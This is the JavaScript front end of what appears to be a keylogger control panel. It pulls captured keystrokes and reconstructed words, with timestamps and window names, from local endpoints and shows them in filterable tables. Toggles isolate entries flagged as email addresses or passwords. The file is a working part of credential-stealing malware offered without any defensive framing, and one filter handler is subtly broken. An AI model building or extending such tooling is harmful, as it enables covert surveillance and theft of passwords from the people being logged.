$(document).ready(function(){
    // Initialise toggle buttons
    $('#emailToggle').bootstrapToggle();
    $('#passwordToggle').bootstrapToggle();

    // Initialise and populate keypresses table
    $('#tableKeypresses').DataTable({
        data: getKeyData(),
        columns: [
            { data: 'datetime' },
            { data: 'processedKey' },
            { data: 'windowName' },
            { data: 'isKeyDown' }
        ],
        "order": [[ 0, "desc" ]]

    });

    // Initialise and populate words table
    $('#tableWords').DataTable({
        data: getWordData(),
        columns: [
            { data: 'datetime' },
            { data: 'windowName' },
            { data: 'processedWord' },
            { data: 'isEmail'},
            { data: 'isPassword' }
        ],
        "order": [[ 0, "desc" ]]

    });
    $('.dataTables_length').addClass('bs-select');

    // Search functionality for toggles
    // ======================
    // =
    // =    Key toggles
    // =
    // ======================
    var keyTable = $('#tableKeypresses').DataTable();
    $('#keydownToggle').change(function () {
        if (this.checked) {
            addSearchParameter(keySearches, "isKeyDown")
            keyTable.search(generateSearchQuery(keySearches)).draw();
        } else {
            removeSearchParameter(keySearches, "isKeyDown")
            keyTable.search(generateSearchQuery(keySearches)).draw();
        }
    });

    $('#noneToggle').change(function () {
        if (this.checked) {
            // wordTable.search("isPassword").draw();
            addSearchParameter(keySearches, "^((?!None).)*$")
            wordTable.search(
                generateSearchQuery(keySearches),true
            ).draw();
        } else {
            removeSearchParameter(keySearches, "None")
            wordTable.search(generateSearchQuery(keySearches)).draw();
        }
    });

    // ======================
    // =
    // =    Word toggles
    // =
    // ======================
    var wordTable = $('#tableWords').DataTable();
    
    $('#emailToggle').change(function () {
        if (this.checked) {
            addSearchParameter(wordSearches, "isEmail")
            wordTable.search(generateSearchQuery(wordSearches)).draw();
        } else {
            removeSearchParameter(wordSearches, "isEmail")
            wordTable.search(generateSearchQuery(wordSearches)).draw();
        }
    });

    $('#passwordToggle').change(function () {
        if (this.checked) {
            // wordTable.search("isPassword").draw();
            addSearchParameter(wordSearches, "isPassword")
            wordTable.search(generateSearchQuery(wordSearches)).draw();
        } else {
            removeSearchParameter(wordSearches, "isPassword")
            wordTable.search(generateSearchQuery(wordSearches)).draw();
        }
    });

    
})

// Searches are stored as strings inside an array
var keySearches = new Set();
var wordSearches = new Set();

// When passed into datatable, these strings will become a single string,
//      with each element separated by a space (" ")
function addSearchParameter(set, query) {
    set.add(query);
}

function removeSearchParameter(set, query) {
    set.delete(query);
}

function generateSearchQuery(set) {
    strArr = []

    for (str of set) {
        strArr.push(str);
    }

    return strArr.join(" ")
}

// =========================
// =
// =        Keys
// =
// ========================
class Key {
    constructor(datetime, isKeyDown, windowName, processedKey) {
        this.datetime = datetime;
        if (isKeyDown) {
            this.isKeyDown = "isKeyDown"
        } else {
            this.isKeyDown = "notKeyDown"
        }
        this.windowName = windowName;
        this.processedKey = processedKey;

    }
}

function getKeyData() {
    res = []
    var data = $.parseJSON($.ajax({
        url: "./showKeylog",
        method: "GET",
        dataType: 'json',
        async: false
    }).responseText);

    $.each(data, function(key, el) {
        res.push(
            new Key(el.datetime, el.isKeyDown, el.windowName, el.processedKey)
        );
    });

    return res
}
  
  // request and display all the keys collected
// function showKeys() {
//     res = []
//     console.log("res at start:" + res);
//     $.ajax({
//       url: "./showKeylog",
//       method: "GET",
//       dataType: 'json',
//       success: (data) => {
//           console.log("res before: " + res);
//           res = data;
//           console.log("res after: " + res);

//       },
//       fail: console.log("Failed to show key log")
//     });
//     console.log("res outside: " + res);
//     return getKeyData(res)
// }

// function showKeyTable(keys){
//     $('#keyAll > table > tbody').empty();
//     keys.forEach((item) => {
//         $('#keyAll > table > tbody').append(
//             '<tr><td>'
//             + item.datetime
//             +'</td><td>'
//             + item.isKeyDown
//             +'</td><td>'
//             + item.windowName
//             +'</td><td>'
//     	    + item.processedKey
//     	    +'</td></tr>'
//         )
//     })
// }



// =========================
// =
// =        Words
// =
// ========================

class Word {
    constructor(datetime, windowName, processedWord, isEmail, isPassword) {
        this.datetime = datetime;
        this.windowName = windowName;
        this.processedWord = processedWord;

        if (isEmail) {
            this.isEmail = "isEmail"
        } else {
            this.isEmail = "notEmail"
        }
        
        if (isPassword) {
            this.isPassword = "isPassword"
        } else {
            this.isPassword = "notPassword"
        }

    }
}

function getWordData() {
    res = []
    var data = $.parseJSON($.ajax({
        url: "./showWordlog",
        method: "GET",
        dataType: 'json',
        async: false
    }).responseText);

    $.each(data, function(key, el) {
        res.push(
            new Word(el.datetime, el.windowName, el.processedWord, el.isEmail, el.isPassword)
        );
    });

    return res
}
// // request and display all the words collected
// function showWords() {
//     $.ajax({
//       url: "./showWordlog",
//       method: "GET",
//       dataType: 'json',
//       success: showWordTable,
//       fail: console.log("Failed to show word log")
//     });
//     console.log("help");
// }
  
// function showWordTable(words){
//     $('#wordAll > table > tbody').empty();
//     $.each(words, function(key, item){
//         console.log(item)
//         $('#wordAll > table > tbody').append(
//             '<tr><td>'
//             + item.datetime
//             +'</td><td>'
//             + item.windowName
//             +'</td><td>'
//             + item.processedWord
//             +'</td><td>'
//     	    + item.isEmail
//     	    +'</td><td>'
//     	    + item.isPassword
//     	    +'</td></tr>'
//         )
//     })
// }

